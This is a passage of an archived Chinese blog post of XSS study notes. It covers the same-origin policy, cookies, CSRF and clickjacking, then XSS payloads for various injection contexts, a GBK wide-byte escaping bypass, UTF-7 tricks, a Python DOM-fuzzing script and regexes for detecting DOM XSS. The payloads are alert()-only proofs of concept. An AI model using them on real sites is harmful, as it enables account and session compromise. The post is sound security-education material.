@@ -1,0 +1,1264 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[旧文归档] XSS 笔记乱记 | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [旧文归档] XSS 笔记乱记
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-04-28
+              </span>
+              <span>
+                59 min read
+              </span>
+              
+                <a href="https://su18.org/tag/4WyFgueFG/" class="post-tag">
+                  # xss
+                </a>
+              
+                <a href="https://su18.org/tag/TjYa_DdRZS/" class="post-tag">
+                  # 渗透测试
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/xss.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="基础补充">基础补充</h1>
+<p>HTML5提供了一个新的客户端存储机制:在浏览器端，使用SQLite数据库保存客服端数据，该机制允许使用JavaScript脚本操作SQL语句，从而与本地数据库进行交互。</p>
+<p>同源策略规定:不同域的客户端脚本在没明确授权的情况下，不能读写对方的资源。</p>
+<p>比如Ajax跨域访问，默认情况下是不允许跨域访问的，只有目标站点明确返回HTTP响应头:</p>
+<p>Access-Control-Allow-Origin</p>
+<p>HTTP请求头里的Referer只可读</p>
+<p>DOM全程Document Object Model，文档对象模型，就是浏览器将HTML/XML这样的文档抽象成一个树形结构。这样方便JS进行读写操作。</p>
+<p>URL编码方式有三类，escape、encodeURI、encodeURIComponent，对应的解码函数是:unescape、decodeURI、decodeURIComponent这三个编码函数是有差异的，甚至浏览器在自动URL编码中也存在差异。</p>
+<p>HTTP响应中，charset=gbk</p>
+<p>响应资源的类型与字符集。针对不同的资源类型会有不同的解析方式，这个会影响浏览器对响应体里的资源解析方式，因此可能带来安全问题。字符集也会影响浏览器的解码方式，同样可能带来安全问题。</p>
+<p>HTML是由众多标签组成的，标签内还有对应的各种属性。这些标签可以不区分大小写，有的可以不需要闭合。属性的值可以用单引号，双引号，反单引号包围住，甚至不需要引号。多余的空格与tab毫不影响HTML的解析。</p>
+<p>我们的很多数据都存在DOM树中，通过DOM树的操作可以非常容易地获取到我们的隐私数据。可能存储在以下位置:</p>
+<p>HTML内容中；浏览器本地存储中，如Cookies；URL地址中。</p>
+<p>当页面使用iframe方式嵌入一个页面时，父页与子页之间如何跨文档读写数据？</p>
+<p>如果父页和子页是同域，他们可以使用contentWindow互相操作。</p>
+<p>如果他们不同域，则必须遵守同源策略，但子页还是可以对父页的location值进行写操作，这样可以让父页重定向到其他网页，不过对location的操作仅仅只有写权限，而没有读权限，这样就不能获取到父页location url的内容否则有可能会造成隐私数据泄露，比如，有的网站将身份认证token存在于URL中。</p>
+<p>AJAX的核心对象是XMLHttpRequest，一般简称为xhr。</p>
+<p>AJAX是严格遵守同源策略的，新标准中来源域浏览器会自动带上Origin头，目标域要判断这个值，如果是自己预期的，则返回</p>
+<p>Access-Control-Allow-Origin表示同意跨域，如果不这样做，浏览器会报权限错误。</p>
+<p>这个就是CORS(Cross-Origin Resource Sharing)</p>
+<p>子域cookie机制:设置cookie时，如果不指定domain的值，默认就是本域。可以指定domain为父级域，这样可以在不同的子域共享cookie。这个机制不允许设置cookie的domain为下一级子域或其他的外域。</p>
+<p>路径cookie机制:设置cookie时，如果不指定path的值，默认就是目标页面的路径。</p>
+<p>有什么办法跨路径读取cookie？可以通过跨iframe进行DOM操作。</p>
+<p>所以，通过设置path不能防止cookie被盗。</p>
+<p>HttpOnly机制:设置此标志后，客户端脚本无法读写cookie。</p>
+<p>Secure Cookie机制:设置此标记的cookie仅在HTTPS层面安全传输。</p>
+<p>本地cookie与内存cookie，</p>
+<p>它与过期时间(expires字段)，如果没设置过期时间，就是内存cookie，会随着浏览器的关闭从内存中消失，如果设置了过期时间是未来的某个时间点，那么这样的cookie就会以文本形式保存在操作系统本地。</p>
+<p>E4X技术可以混淆JS代码，甚至绕开一些过滤规则。</p>
+<p>js函数劫持，一定程度上可以自动化分析 DOM XSS，可以动态解密一些混淆的代码。</p>
+<p>XSS有三类，反射型，存储型，DOM XSS。</p>
+<p>DOM XSS的代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。</p>
+<p><strong>常见的输入点</strong></p>
+<ul>
+<li>
+<p>document.URL</p>
+</li>
+<li>
+<p>document.URLUnencoded</p>
+</li>
+<li>
+<p>document.location(以及location的多个属性)</p>
+</li>
+<li>
+<p>document.referer</p>
+</li>
+<li>
+<p>window.location(以及location的多个属性)</p>
+</li>
+<li>
+<p>window.name</p>
+</li>
+<li>
+<p>xhr请求回来的数据</p>
+</li>
+<li>
+<p>document.cookie</p>
+</li>
+<li>
+<p>表单项的值</p>
+</li>
+</ul>
+<p><strong>常见的输出点</strong></p>
+<p>直接输出HTML内容，如：</p>
+<ul>
+<li>document.write(...)</li>
+<li>document.writeln(...)</li>
+<li>document.body.innerHtml=...</li>
+</ul>
+<p>直接修改DOM树（包括DHTML事件），如：</p>
+<ul>
+<li>document.forms[0].action=...（以及其他集合，如一些对象的 src/href 属性等）</li>
+<li>document.attachEvent(...)</li>
+<li>document.create...(...)</li>
+<li>document.execCommand(...)</li>
+<li>document.body. ...(直接通过body对象访问 DOM)</li>
+<li>windows.attachEvent(...)</li>
+</ul>
+<p>替换 document URL，如：</p>
+<ul>
+<li>document.location=...(以及直接赋值给 location 的href，host，hostname属性)</li>
+<li>document.location.hostname=...</li>
+<li>document.location.replace(...)</li>
+<li>document.location.assign(...)</li>
+<li>document.URL=...</li>
+<li>window.navigate(...)</li>
+</ul>
+<p>打开或修改新窗口，如：</p>
+<ul>
+<li>document.open(...)</li>
+<li>window.open(...)</li>
+<li>window.location.href=...(以及直接赋值给location的 href，host，hostname 属性)</li>
+</ul>
+<p>直接执行脚本，如：</p>
+<ul>
+<li>eval(...)</li>
+<li>window.execScript(...)</li>
+<li>window.setInterval(...)</li>
+<li>window.setTimeout(...)</li>
+</ul>
+<p>CSRF跨站请求伪造，攻击过程有三个关键点，跨域发出了一个GET请求、可以无JS参与、请求是身份认证后的。</p>
+<p>由客户端HTML标签等发出的跨域GET请求被认为是合法的，不在同源策略的限制中但是这些请求发出后并没能力得到目标页面响应的数据内容。</p>
+<p>可以有JS参与，也可以没有。</p>
+<p>对于POST请求，可以通过表单提交实现。</p>
+<p>按照请求类型来区分，就是GET型与POST型CSRF。</p>
+<p>按照攻击方式分类，就是HTML CSRF，JSON HiJacking攻击和Flash CSRF攻击等。</p>
+<p>HTML中能够设置 src/href 等链接地址的标签都可以发起一个GET请求。</p>
+<p>界面操作劫持是一种基于视觉欺骗的Web会话劫持攻击，通过在网页的可见输入控件上覆盖一个不可见的框(iframe)，使用户执行其中的恶意劫持代码。</p>
+<p>主要分为三种，点击劫持，拖放劫持，触屏劫持。</p>
+<h1 id="漏洞挖掘">漏洞挖掘</h1>
+<p>CSRF漏洞挖掘只要确认以下内容即可。</p>
+<ul>
+<li>目标表单是否有有效的token随机串。</li>
+<li>目标表单是否有验证码。</li>
+<li>目标是否判断了Referer来源。</li>
+<li>网站根目录下crossdomain.xml中的allow-access-from domain是否是通配符。</li>
+<li>目标JSON数据似乎可以自定义callback函数等。</li>
+</ul>
+<p>界面操作劫持的漏洞挖掘只要确认以下内容即可。</p>
+<ul>
+<li>目标的HTTP响应头是否设置好了X-Frame-Options字段。</li>
+<li>目标是否有JavaScript的Frame Busting机制。</li>
+<li>用iframe嵌入目标网站试试，若成功，则说明漏洞存在。</li>
+</ul>
+<h2 id="普通xss漏洞自动化挖掘思路">普通XSS漏洞自动化挖掘思路</h2>
+<p>假设服务端不对用户输入与相应输出做任何编码与过滤</p>
+<p>输出位置:</p>
+<h3 id="1html标签之间">1.HTML标签之间</h3>
+<p>最普通的场景出现在 <code>&lt;div id=&quot;body&quot;&gt;[输出]&lt;/div&gt;</code> ，可以直接提交：</p>
+<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>就可以触发XSS了，但是在下面这些标签中，则不会</p>
+<pre><code class="language-html">&lt;title&gt;&lt;/title&gt;
+&lt;textarea&gt;&lt;/textarea&gt;
+&lt;xmp&gt;&lt;/xmp&gt;
+&lt;iframe&gt;&lt;/iframe&gt;
+&lt;noscript&gt;&lt;/noscript&gt;
+&lt;noframes&gt;&lt;/noframes&gt;
+&lt;plaintext&gt;&lt;/plaintext&gt;
+</code></pre>
+<p>面对这个位置，我们需要先闭合标签</p>
+<p>除了这些，还有两类特殊的标签 <code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>，它们本身是不能嵌套标签的，而且payload构造情况会更灵活，除了闭合对应的标签外，还可以利用它们自身可执行脚本的性质来构造特殊的payload。</p>
+<h3 id="2html标签之内">2.HTML标签之内</h3>
+<h4 id="1输出在value属性内">1）输出在value属性内</h4>
+<p>最普通的场景出现在<code>&lt;input type=&quot;text&quot; value=&quot;[输出]&quot; /&gt;</code> 位置，要触发XSS，有以下两种方法：</p>
+<ul>
+<li>提交payload：<code>&quot; onmouseover=alert(1) x=&quot;</code> ，这种是闭合属性，然后使用on事件来触发脚本。</li>
+<li>提交payload：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> ，这种是闭合属性后又闭合标签，然后直接执行脚本。</li>
+</ul>
+<p>如果在下面的场景：<code>&lt;input type=&quot;hidden&quot; value=&quot;[输出]&quot; /&gt;</code> ，一般情况下，此时我们只能闭合 input 标签，否则由于hidden特性导致触发不了 XSS</p>
+<p>如果在下面的场景：<code>&lt;input value=&quot;[输出]&quot; type=&quot;hidden&quot;/&gt;</code> ，和上面的仅仅是属性顺序不同，我们应该使用如下payload：</p>
+<pre><code class="language-html">1&quot; onmouseover=alert(1) type=&quot;text
+</code></pre>
+<p>这样成功率更高，更有效率，而且将输出变为一个标准的输入框，鼠标移上去就可以触发XSS。</p>
+<p>同样的，遇到disabled属性也是一样的方法。</p>
+<h4 id="2输出在-srchrefaction-属性内">2）输出在 src/href/action 属性内</h4>
+<p>如 <code>&lt;a href=&quot;[输出]&quot;&gt;click me&lt;/a&gt;</code> ，我们除了各种闭合之外，还可以：</p>
+<pre><code class="language-javascript">javascript:alert(1)//
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+</code></pre>
+<p>前提是我们提交的payload必须出现在这些属性值的开头部分（data: 协议的必须作为整个属性值出现）</p>
+<p>对于第一个 javascript: 伪协议，所有的浏览器都支持 ，不过有些差异。</p>
+<p>对于第二个 data: 协议，仅IE浏览器不支持。</p>
+<p>对于第一个，如果过滤了 / ，我们可以利用JavaScript逻辑与算数运算符，因为JavaScript是弱类型语言。</p>
+<p>比如：<code>javascript:alert(1)-</code></p>
+<p>输出后点击同样触发，只不过浏览器会报错，这样的错误是可以屏蔽的：<code>window.onerror=function(){return true;}</code></p>
+<h4 id="3输出在-on-事件内">3）输出在 on* 事件内</h4>
+<p>由于 on* 事件内是可以执行 JavaScript 脚本的。根据不同场景，我们需要弄清楚我们的输出是作为整个 on 事件的值出现，还是以某个函数的参数值出现，这个函数是什么等。不同场景可能需要不同的闭合策略，最终目标都是让我们的脚本能顺利执行。</p>
+<h4 id="4输出在-style-属性内">4）输出在 style 属性内</h4>
+<p>现在在 style 中执行脚本已经是 IE 浏览器独有的特性。对于 IE 来说，在标签的 style 属性中只要能注入 expression 关键词，并进行适当的闭合，我们就可以认为目标存在XSS，比如注入：</p>
+<pre><code class="language-css">1;xss:expression(if(!windows.x){alert(1);window.x=1;})
+</code></pre>
+<p>得到输出：</p>
+<pre><code class="language-html">&lt;a href=&quot;#&quot; style=“width:1;xss:expression(if(!windows.x){alert(1);window.x=1;})&quot;&gt;click me&lt;/a&gt;
+</code></pre>
+<h4 id="5属性引用符号">5）属性引用符号</h4>
+<p>HTML是一个很不严格的标记语言，属性值可以不用引号，或者使用单引号，双引号，反单引号（仅IE浏览器支持）进行引用。如：</p>
+<pre><code class="language-html">&lt;a href=`javascript:alert(1)-html`&gt;click me&lt;/a&gt;
+</code></pre>
+<p>这样导致我们的闭合机制需要更灵活，以更大地提高检出率。因为如果同时提交'，&quot;，` 三种引号进行闭合，可能会因为网站SQL注入防御屏蔽了单引号导致请求失败，而目标输出又是双引号进行属性值引用的。所以，对于XSS漏洞挖掘工具来说，需要具备识别闭合引号的有无及其类型，并提交针对性的闭合 payload。</p>
+<h3 id="3成为-javascript-代码的值">3.成为 JavaScript 代码的值</h3>
+<p>我们的payload可以是</p>
+<pre><code class="language-html">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&quot;;alert(1)//
+</code></pre>
+<p>与其他一样，这个地方就是闭合标签，或闭合变量值的引用。</p>
+<h3 id="4请求中的玄机">4.请求中的玄机</h3>
+<p>在漏洞挖掘中，我们可以发送“探子请求”。在真正的payload攻击请求之前，总会发起一次无危害（不包含任何特殊符号的请求），主要有以下两个目的：</p>
+<ul>
+<li>目标参数值是否会出现在响应上，如果不出现，就完全没必要进行后续的 payload 请求与分析</li>
+<li>目标参数值出现在 HTML 的哪个部分。</li>
+</ul>
+<p>这个“探子”，一般是26个字母+10个数字组合后，取8位左右的随机字符串，保证在响应的HTML中不会与已有的字符串冲突就行。知道探子的结构后，有利于我们进行定位，尤其是对于输入点有多组参数时，可以大大提高挖掘的效率。</p>
+<h3 id="5关于存储型xss挖掘">5.关于存储型XSS挖掘</h3>
+<p>对于存储型的输出，一般位于：</p>
+<ul>
+<li>表单提交后跳转到的页面有可能是输出点。</li>
+<li>表单所在的页面有可能就是输出点。</li>
+<li>表单提交后不见了，需要在整个网站去找目标输出点，这个需要爬虫对网站进行再次爬取分析，当然这个过程是可以优化的，比如使用页面缓存技术，判断目标页面是否变动，一般发送 Last-Modified 与 Etag 头部，根据响应状态码进行判断。</li>
+</ul>
+<h2 id="dom渲染">DOM渲染</h2>
+<h3 id="html与javascript自解码机制">HTML与JavaScript自解码机制</h3>
+<p>关于这个自解码机制，我们直接举一个例子：</p>
+<pre><code class="language-html">&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write('&lt;img src=@ onerror=alert(123) /&gt;')&quot; /&gt;
+</code></pre>
+<p>我们假设 document.write 里的值是用户可控的输入，点击后，document.write 出现一段 img HTML，onerror里的 JavaScript 会执行。</p>
+<p>如果我们现在有一段 HtmlEncode 函数如下：</p>
+<pre><code class="language-html">&lt;script&gt;
+  function HtmlEncode(str){
+    var s = &quot;&quot;;
+    if (str.length == 0) return &quot;&quot;;
+    s = str.replace(/&amp;/g,&quot;&amp;amp;&quot;);
+    s = s.replace(/&lt;/g,&quot;&amp;lt;&quot;);
+    s = s.replace(/&gt;/g,&quot;&amp;gt;&quot;);
+    s = s.replace(/\&quot;/g,&quot;&amp;quot;&quot;);
+    return s;
+  }
+&lt;/script&gt;
+&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(HtmlEncode('&lt;img src=@ onerror=alert(123) /&gt;'))&quot; /&gt;
+</code></pre>
+<p>我们知道编码之后的结果是</p>
+<pre><code class="language-html">&amp;lt;img src=@ onerror=alert(123) /&amp;gt;
+</code></pre>
+<p>这样点击后会执行 alert(123) 吗，那下面这个呢？</p>
+<pre><code class="language-html">&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write('&amp;lt;img src=@ onerror=alert(123) /&amp;gt;')&quot; /&gt;
+</code></pre>
+<p>在两个例子中，document.write 的值似乎是一样的。实际结果是第一个例子点击不会执行alert(123)，而是在页面上完整的打印，而第二个例子会执行 alert(123)。</p>
+<p>实际上，在点击第二个例子时，document.write 实际上是<code>&lt;img src=@ onerror=alert(123) /&gt;</code></p>
+<p>原因如下：</p>
+<p>onclick 里的这段 JavaScript 出现在 HTML 标签内，意味着这里的 JavaScript 可以进行 <strong>HTML 形式的编码</strong>，这种编码有以下两种：</p>
+<ul>
+<li><strong>进制编码：&amp;#xH;（十六进制格式）、&amp;#D;（十进制格式），最后的分号可以省略</strong></li>
+<li><strong>HTML实体编码；就是上面的HtmlEncode</strong></li>
+</ul>
+<p>在 JavaScript 执行之前，HTML 形式的编码会自动解码。所以第二个例子与最初的例子是一样的结果。</p>
+<p>那如果用户输入在<code>&lt;script&gt;</code> 标签里的 JavaScript 中，情况如下：</p>
+<pre><code class="language-html">&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; /&gt;
+&lt;script&gt;
+  function $(id){return document.getElementById(id);};
+  $('exec_btn').onclick = function(){
+    document.write('&lt;img src=@ onerror=alert(123) /&gt;');
+    //document.write('&amp;lt;img src=@ onerror=alert(123) /&amp;gt;');
+  }
+&lt;/script&gt;
+</code></pre>
+<p>这样是可以执行 alert(123) 的，如果用户输入的是下面的内容：</p>
+<pre><code class="language-html">&amp;lt;img src=@ onerror=alert(123) /&amp;gt;
+</code></pre>
+<p>则不会，因为用户输入的这段内容上下文环境是 JavaScript，不是HTML，此时用户输入的这段内容要遵守的是 JavaScript 法则，即 JavaScript 编码，具体有如下几种形式：</p>
+<ul>
+<li><strong>Unicode形式：\uH（十六进制）</strong></li>
+<li><strong>普通十六进制：\xH</strong></li>
+<li><strong>纯转义：<code>\'、\&quot;、\&lt;、\&gt;</code>这样在特殊字符之前加 \ 进行转义</strong></li>
+</ul>
+<p>在 JavaScript 执行之前，这样的编码会自动解码。</p>
+<h3 id="具备-htmlencode-功能的标签">具备 HtmlEncode 功能的标签</h3>
+<p>如下标签：</p>
+<pre><code class="language-html">&lt;title&gt;&lt;/title&gt;
+&lt;textarea&gt;&lt;/textarea&gt;
+&lt;iframe&gt;&lt;/iframe&gt;
+&lt;noscript&gt;&lt;/noscript&gt;
+&lt;noframes&gt;&lt;/noframes&gt;
+</code></pre>
+<p><code>&lt;xmp&gt;</code> 没有 HtmlEncode 功能，<code>&lt;plaintext&gt;</code> 在 Firefox 与 Chrome 下有差异，Firefox下不会进行 HtmlEncode  编码，而 Chrome 下会，这样的差异有时候会导致安全问题。</p>
+<h3 id="url编码差异">URL编码差异</h3>
+<p>浏览器在处理用户发起请求时的 urlencode 策略存在差异，导致在某些场景中出现 XSS 漏洞。</p>
+<h3 id="dom修正式渲染">DOM修正式渲染</h3>
+<p>我们经常通过网页源码功能来看所谓的”HTML源码“。这样看到的实际上是静态的。我们研究 DOM XSS 接触的必须是动态结果。</p>
+<p>我们可以使用 F12 打开对应的调试工具，也可以执行以下 JavaScript 语句进行查看：</p>
+<pre><code class="language-html">document.documentElement.innerHTML;
+</code></pre>
+<p>通过这些，我们可以发现这些浏览器在 DOM 渲染上进行各种修正，不同的浏览器进行的这种修正可能存在一些差异。这种修正式的渲染可以用于绕过浏览器的 XSS Filter</p>
+<p>“修正”功能不仅是浏览器的性质，其实在很多过滤器里都会有，有的人把这个过程叫做DOM重构。修正包括如下内容：标签正确闭合，属性正确闭合。</p>
+<h3 id="一种dom-fuzzing技巧">一种DOM fuzzing技巧</h3>
+<p>python代码：</p>
+<pre><code class="language-python">def get_template(template_file):
+    &quot;&quot;&quot;
+    获取 fuzzing 的模板文件内容
+    :param template_file:
+    :return:
+    &quot;&quot;&quot;
+    f = open(template_file)
+    template = f.read()
+    f.close()
+    return template
+
+
+def set_result(result_file, result):
+    &quot;&quot;&quot;
+    生成 fuzzing 结果文件
+    :param result_file:
+    :param result:
+    :return:
+    &quot;&quot;&quot;
+    f = open(result_file, 'w')
+    f.write(result)
+    f.close()
+
+
+if __name__ == '__main__':
+    template = get_template(&quot;fuzz_xss_0.htm&quot;)
+    fuzz_area_0 = template.find('&lt;fuzz&gt;')
+    fuzz_area_1 = template.find('&lt;/fuzz&gt;')
+    fuzz_area = template[fuzz_area_0+6: fuzz_area_1].strip()
+    # chars = [chr(47), chr(32), chr(10)]
+    chars = []
+    for i in range(255):  # ASCII码转换为字符
+        if i != 62:
+            chars.append(chr(i))
+
+    fuzz_area_result = ''
+    for c in chars:  # 遍历这些字符，逐一生成fuzzing内容
+        fuzz_area_r = fuzz_area.replace('{{char}}', c)
+        fuzz_area_r = fuzz_area_r.replace('{{id}}', str(ord(c)))
+        fuzz_area_result += fuzz_area_r + '\n'
+        print(fuzz_area_r)
+    result = template.replace(fuzz_area, fuzz_area_result)
+    set_result('r.htm', result)
+</code></pre>
+<p>模板：</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;gbk&quot;&gt;
+    &lt;title&gt;Fuzz XSS 0&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;script&gt;
+    function $(x) {return document.getElementById(x);}
+    function f(id) {
+        $('result').innerHTML += id+'&lt;br /&gt;';
+    }
+&lt;/script&gt;
+
+&lt;h3&gt;Fuzzing Result:&lt;/h3&gt;
+&lt;script&gt;
+    {{id}}:&lt;{{char}}script&gt;f(&quot;{{id}}&quot;)&lt;/script&gt;
+&lt;/xmp&gt;
+
+&lt;div id=&quot;result&quot;&gt;&lt;/div&gt;&lt;!-- fuzzing 成功的字符ASCII码存储在这 --&gt;
+
+&lt;br /&gt;
+
+&lt;h3&gt;Fuzzing...&lt;/h3&gt;
+&lt;!-- 以下是待替换的模板标签内容 --&gt;
+&lt;fuzz&gt;
+    {{id}}:&lt;{{char}}script&gt;f(&quot;{{id}}&quot;)&lt;/script&gt;&lt;br /&gt;
+&lt;/fuzz&gt;&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>就这两个简单的文件，fuzz_xss_0.py 会调用 fuzz_xss_0.htm 这个 fuzzing 模板去按需生成结果文件 r.htm，然后用浏览器打开r.htm，如果<code>&lt;fuzz&gt;&lt;/fuzz&gt;</code> 里的某项可以被浏览器正确执行，那么就会触发 f 函数， f 函数会往 id 为 result 的 <code>&lt;div&gt;</code> 标签里写模糊测试成功的字符串 ASCII码。</p>
+<h2 id="dom-xss挖掘">DOM XSS挖掘</h2>
+<p>首先就要弄清楚输入点和输出点是什么</p>
+<h3 id="静态方法">静态方法</h3>
+<p>静态方法如果想要工具化，可以使用下面这个链接提到的正则表达式来匹配：</p>
+<p>输入点匹配的正则表达式如下</p>
+<pre><code class="language-shell">/(location\s*[\[.])|([.\[]\s*[&quot;']?\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\W)|(localStorage|sessionStorage|Database)/
+</code></pre>
+<p>输出点匹配的正则表达式如下</p>
+<pre><code class="language-shell">/((src|href|data|location|code|value|action)\s*[&quot;'\]]*\s*\+?\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\s*[&quot;'\]]*\s*\()/
+</code></pre>
+<p>一旦发现页面存在可以特征，就进行人工分析，这是静态方法的代价。</p>
+<h3 id="动态方法">动态方法</h3>
+<p>在模糊测试提交的内容都有如下一段代码：</p>
+<p>document.write('d0m'+'x55')</p>
+<p>如果这段代码顺利执行了，当前DOM树就会存在 d0mx55 文本节点，后续的检测工作只要判断是否存在这个文本节点即可。</p>
+<pre><code class="language-javascript">if(document.documentElement.innerHTML.indexOf('d0mx55')!=-1){
+    alert('found dom xss');
+};
+</code></pre>
+<p>以DOM树的改变为判断依据，简单且准确，不过同样无法避免那些逻辑判断上导致的漏报。</p>
+<h2 id="字符集缺陷导致的xss">字符集缺陷导致的XSS</h2>
+<h3 id="基本概念">基本概念</h3>
+<h4 id="1字符与字节">1.字符与字节</h4>
+<p>肉眼看到的一个文字或符号单元就是一个字符（包括乱码），一个字符可能对应 1~n 字节，1字节为 8 位，每一位都是 0 或 1 。</p>
+<h4 id="2字符集">2.字符集</h4>
+<p>一个字符对应 1~n 字节是由字符集与编码决定的。比如 ASCII 字符集就是一个字符对应 1 字节，不过 1 字节只用了 7 位，最高位用于其他目的，所以 ASCII 字符集共有 2 的 7 次方（128）个字符。</p>
+<h4 id="3字符集编码">3.字符集编码</h4>
+<p>每种字符集大都对应一种编码方式，常见的是 UTF-8 与 UTF-7</p>
+<h3 id="宽字节编码带来的安全问题">宽字节编码带来的安全问题</h3>
+<p>GB2312、GBK、GB18030、BIG5、Shift_JIS 等都是常说的宽字节，实际上只有两字节。</p>
+<p>宽字节带来的安全问题主要是吃 ASCII 字符（一字节）的现象。</p>
+<p>比如，在下面这个 PHP 示例，在 magic_quotes_gpc = On 的情况下，如何触发XSS？</p>
+<pre><code class="language-php">&lt;?php header(&quot;Content-Type:text/html;charset=GBK&quot;); ?&gt;
+&lt;head&gt;
+&lt;title&gt; gb xss &lt;/title&gt;
+&lt;/head&gt;
+&lt;script&gt;
+a = &quot;&lt;?php echo $_GET['x'];?&gt;&quot;;
+&lt;/script&gt;
+</code></pre>
+<p>首先，我们想到，需要闭合双引号</p>
+<pre><code class="language-html">gb.php?x=1&quot;;alert(1)//
+</code></pre>
+<p>双引号会被转义成 <code>\&quot;</code> ，导致闭合失败：</p>
+<pre><code class="language-html">a=&quot;1\&quot;;alert(1)//&quot;;
+</code></pre>
+<p>由于这个网页头部响应指明了这是GBK编码，GBK编码第一字节（高字节）的范围是 0x81~0xFE，第二字节（低字节）的范围是 0x40~0x7E 与 0x80~0xFE，这样的十六进制表示。</p>
+<p>而\符号的十六进制表示为 0x5C，正好在 GBK 的低字节中，如果之前有一个高字节，那么正好会被组成一个合法字符，于是提交如下：</p>
+<pre><code class="language-html">gb.php?x=1%81&quot;;alert(1)//
+</code></pre>
+<p>双引号会继续被转义成 <code>\&quot;</code> ，最终如下：</p>
+<pre><code>a=&quot;1[0x81]\&quot;;alert(1)//&quot;;
+</code></pre>
+<p><code>[0x81]\</code> 组成了一个合法字符，于是之后的双引号就会产生闭合。就成功触发了XSS。</p>
+<p>这些宽字节编码的高低位范围都不太相同。</p>
+<p>有一点要注意，GB2312 是被GBK兼容的，它的高位范围是 0xA1~0xF7 ，低位范围是 0xA1~0xFE (0x5C 不在范围内)，把上面的 PHP 代码的 GBK 改为 GB2312，在浏览器中处理行为同 GBK。</p>
+<h3 id="utf-7-问题">UTF-7 问题</h3>
+<p>UTF-7是 Unicode字符集的一种编码方式，不过并非是标准推荐的，现在仅IE浏览器还支持 UTF-7 的解析。</p>
+<p>IE浏览器历史上出现以下好几类 UTF-7 XSS</p>
+<h4 id="1自动选择-utf-7-编码">1.自动选择 UTF-7 编码</h4>
+<p>在IE 6/7 时代，如果没声明 HTTP 响应头字符集编码方式或声明错误：</p>
+<pre><code class="language-http">Content-Type: text/html;charset=utf-8 //声明字符集编码方式
+Content-Type: text/html  // 未声明字符集编码方式
+Content-Type: text/html；charset=uf-8 //声明错误的字符集编码方式
+</code></pre>
+<p>同时，<code>&lt;meta http-equiv&gt;</code> 未指定 charset 或指定错误，那么 IE 浏览器会判断响应内容中是否出现 UTF-7 编码的字符串，如果有当前页面会自动选择 UTF-7 编码方式，如下：</p>
+<pre><code class="language-html">&lt;title&gt; utf-7 xss &lt;/title&gt;
++ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
+&lt;div&gt;123&lt;/div&gt;
+</code></pre>
+<h4 id="2通过-iframe-方式调用外部-utf-7-编码的html-文件">2.通过 iframe 方式调用外部 UTF-7 编码的HTML 文件</h4>
